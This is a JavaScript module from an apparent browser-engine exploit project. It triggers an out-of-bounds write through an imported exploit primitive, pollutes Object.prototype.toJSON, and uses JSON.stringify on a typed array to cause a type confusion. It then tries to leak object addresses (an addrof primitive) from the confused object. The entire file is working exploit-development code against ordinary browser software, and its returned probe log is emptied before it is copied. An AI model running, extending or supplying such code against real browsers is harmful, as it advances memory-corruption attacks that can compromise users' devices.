// js/script3/testArrayBufferVictimCrash.mjs (v32_TargetUnknownThis)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT = "OriginalHeisenbug_TypedArrayAddrof_v32_TargetUnknownThis";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v32 = null;
let object_to_leak_B_v32 = null;
let victim_typed_array_ref_v32 = null; 
let probe_call_count_v32 = 0;
// Array para armazenar TODOS os detalhes de cada chamada da sonda
let all_probe_interaction_details_v32 = []; 
const PROBE_CALL_LIMIT_V32 = 5; 


function toJSON_TA_Probe_TargetUnknownThis() {
    probe_call_count_v32++;
    const call_num = probe_call_count_v32;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v32_TargetUnknownThis",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v32),
        this_is_prev_marker: (typeof this === 'object' && this !== null && this.hasOwnProperty('marker_v32') && this.marker_v32 === (call_num - 1)),
        writes_on_confused_this_attempted: false,
        confused_this_final_keys: null, // Chaves do 'this' confuso DEPOIS das escritas
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsPrevMarker? ${current_call_details.this_is_prev_marker}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V32) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v32.push(current_call_details); // Adiciona esta chamada final de "parada"
            return { recursion_stopped_v32: true, call: call_num };
        }

        if (current_call_details.this_type === '[object Object]') { 
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION DETECTED for 'this'! (IsVictim? ${current_call_details.this_is_victim}, IsPrevMarker? ${current_call_details.this_is_prev_marker})`, "vuln");
            
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v32) this.leaky_A_payload_v32 = object_to_leak_A_v32; 
            if (object_to_leak_B_v32) this.leaky_B_payload_v32 = object_to_leak_B_v32;
            current_call_details.writes_on_confused_this_attempted = true;
            try { current_call_details.confused_this_final_keys = Object.keys(this); } catch(e){}
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Writes to confused 'this' attempted. Final keys: ${current_call_details.confused_this_final_keys ? current_call_details.confused_this_final_keys.join(',') : 'N/A'}`, "info");
            
            all_probe_interaction_details_v32.push(current_call_details);
            return this; // Retornar o 'this' confuso e modificado
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    all_probe_interaction_details_v32.push(current_call_details);
    return { marker_v32: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_TargetUnknownThis() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TargetUnknownThis) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT} Init...`;

    probe_call_count_v32 = 0;
    all_probe_interaction_details_v32 = []; // Limpa o array global
    victim_typed_array_ref_v32 = null; 
    object_to_leak_A_v32 = { marker: "ObjA_TA_v32tut", id: Date.now() }; 
    object_to_leak_B_v32 = { marker: "ObjB_TA_v32tut", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let details_of_last_probe_call = null; 
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" };
    let addrof_Output_LeakyA = { success: false, msg: "Output.leaky_A: Default"};
    let addrof_Output_LeakyB = { success: false, msg: "Output.leaky_B: Default"};

    const fillPattern = 0.32323232323232;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v32 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v32.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v32 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TargetUnknownThis, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v32); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }
            
            // Pega os detalhes da ÚLTIMA chamada da sonda do array global
            if (all_probe_interaction_details_v32.length > 0) {
                // Faz uma cópia profunda para evitar modificações acidentais e problemas com JSON.stringify do resultado
                details_of_last_probe_call = JSON.parse(JSON.stringify(all_probe_interaction_details_v32[all_probe_interaction_details_v32.length - 1]));
            }
            logS3(`  EXECUTE: Captured details of LAST probe run (from all_probe_interaction_details_v32): ${details_of_last_probe_call ? JSON.stringify(details_of_last_probe_call) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmed = false;
            if (details_of_last_probe_call && 
                details_of_last_probe_call.this_type === "[object Object]") {
                heisenbugConfirmed = true;
            }
            logS3(`  EXECUTE: Heisenbug on 'this' of LAST probe call ${heisenbugConfirmed ? "CONFIRMED" : "NOT Confirmed"}. Last 'this' type: ${details_of_last_probe_call ? details_of_last_probe_call.this_type : 'N/A'}`, heisenbugConfirmed ? "vuln" : "error", FNAME_CURRENT_TEST);
            if(heisenbugConfirmed) {
                 logS3(`    Details from LAST probe call (#${details_of_last_probe_call.call_number}): IsVictim? ${details_of_last_probe_call.this_is_victim}, IsPrevMarker? ${details_of_last_probe_call.this_is_prev_marker}, WritesAttempted? ${details_of_last_probe_call.writes_on_confused_this_attempted}`, "info");
                 logS3(`    Keys of confused 'this' in that call: ${details_of_last_probe_call.confused_this_final_keys ? details_of_last_probe_call.confused_this_final_keys.join(',') : 'N/A'}`, "leak");
            }
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            
            logS3("STEP 4: Checking stringifyOutput_parsed for leaked properties...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                const output_val_A = stringifyOutput_parsed.leaky_A_payload_v32;
                if (typeof output_val_A === 'number' && output_val_A !==0) {
                    let out_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_A]).buffer)[0], new Uint32Array(new Float64Array([output_val_A]).buffer)[1]);
                    if (out_A_int64.high() < 0x00020000 || (out_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = `Possible pointer for Output.leaky_A_payload_v32: ${out_A_int64.toString(true)}`;
                    } else { addrof_Output_LeakyA.msg = `Output.leaky_A_payload_v32 is num but not ptr: ${output_val_A}`; }
                } else if (output_val_A === object_to_leak_A_v32) {
                     addrof_Output_LeakyA.success = true; addrof_Output_LeakyA.msg = "object_to_leak_A_v32 identity in Output.leaky_A_payload_v32.";
                } else { addrof_Output_LeakyA.msg = `Output.leaky_A_payload_v32 not ptr or not present. Val: ${output_val_A}`; }

                const output_val_B = stringifyOutput_parsed.leaky_B_payload_v32;
                 if (typeof output_val_B === 'number' && output_val_B !==0) {
                    let out_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([output_val_B]).buffer)[0], new Uint32Array(new Float64Array([output_val_B]).buffer)[1]);
                    if (out_B_int64.high() < 0x00020000 || (out_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Output_LeakyB.success = true; addrof_Output_LeakyB.msg = `Possible pointer for Output.leaky_B_payload_v32: ${out_B_int64.toString(true)}`;
                    } else { addrof_Output_LeakyB.msg = `Output.leaky_B_payload_v32 is num but not ptr: ${output_val_B}`; }
                } else if (output_val_B === object_to_leak_B_v32) {
                     addrof_Output_LeakyB.success = true; addrof_Output_LeakyB.msg = "object_to_leak_B_v32 identity in Output.leaky_B_payload_v32.";
                } else { addrof_Output_LeakyB.msg = `Output.leaky_B_payload_v32 not ptr or not present. Val: ${output_val_B}`; }
            } else {
                 addrof_Output_LeakyA.msg = "stringifyOutput was not an object or was null.";
                 addrof_Output_LeakyB.msg = "stringifyOutput was not an object or was null.";
            }

            if (addrof_Output_LeakyA.success || addrof_Output_LeakyB.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}: AddrInOutput SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V32_TUT} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v32}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST); // Não esperamos sucesso aqui
        logS3(`Addrof Output.leaky_A: Success=${addrof_Output_LeakyA.success}, Msg='${addrof_Output_LeakyA.msg}'`, addrof_Output_LeakyA.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Output.leaky_B: Success=${addrof_Output_LeakyB.success}, Msg='${addrof_Output_LeakyB.msg}'`, addrof_Output_LeakyB.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v32 = null; 
        all_probe_interaction_details_v32 = []; 
        probe_call_count_v32 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_last_probe_call, 
        all_probe_call_details_for_analysis: [...all_probe_interaction_details_v32], // Retorna cópia do array de logs
        total_probe_calls: probe_call_count_v32,
        addrof_Output_A: addrof_Output_LeakyA, // Renomeado para consistência
        addrof_Output_B: addrof_Output_LeakyB  // Renomeado para consistência
    };
}
